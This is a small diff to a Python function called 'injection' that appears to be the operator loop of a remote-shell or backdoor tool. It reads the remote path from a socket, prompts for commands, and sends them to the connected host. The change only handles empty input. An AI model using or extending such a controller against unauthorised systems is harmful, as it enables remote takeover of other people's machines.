@@ -116,7 +116,12 @@ def injection(h, c, v):
             while True:
                 path = s.recv(buffer).decode('utf-8')
                 command = str(input(f'{host}\\{path}> ')).strip()
-                command_arg1 = command.split()[0]
+                if command == '':
+                    command = 'snake'
+                try:
+                    command_arg1 = command.strip().split()[0]
+                except IndexError:
+                    command_arg1 = command
                 if not custom_client_manager(s, buffer, os.getcwd(), command, command_arg1):
                     s.sendall(bytes(command, 'utf-8'))
                     print(s.recv(buffer).decode('utf-8'))
